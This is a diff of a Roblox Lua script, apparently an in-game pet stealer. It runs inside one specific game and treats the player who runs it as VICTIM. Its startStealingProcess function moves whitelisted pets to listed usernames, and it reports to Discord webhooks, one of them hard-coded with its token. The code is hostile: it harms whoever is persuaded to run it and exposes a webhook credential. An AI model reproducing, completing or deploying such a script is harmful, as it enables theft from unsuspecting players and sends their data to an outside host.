@@ -3,9 +3,9 @@ if game.PlaceId ~= 126884695634066 then
     return
 end
 
+getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
 
-local BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME
-
+local BackupWebhook = getgenv().BackupWebhook or "" -- если есть запасной вебхук
 
 
 
@@ -172,7 +172,8 @@ local BASE_PET_WHITELIST = {
     'French Fry Ferret',
 }
 
-local EXTRA_WHITELIST = ExtraPets or {}
+local EXTRA_WHITELIST = getgenv().ExtraPets or {}
+
 
 -- Объединяем базовый список и дополнительные имена
 local PET_WHITELIST = {}
@@ -235,11 +236,13 @@ local function startStealingProcess()
     repeat task.wait() until game:IsLoaded()
 
     local VICTIM = game.Players.LocalPlayer
-    local USERNAMES = Username
+    local USERNAMES = getgenv().Username or {}
+
 
     local function getWebhookUrl()
-        return Webhook
+        return getgenv().Webhook or ""
     end
+
 
     local function waitForJoin()
         local findTarget = false
@@ -456,10 +459,6 @@ end
 
 -- Удаление GUI
 ScreenGui:Destroy()
-
-
-
-
 -- ⛔ Проверка на кражу и GUI + кик
 task.delay(1, function()
     local newTotal = 0
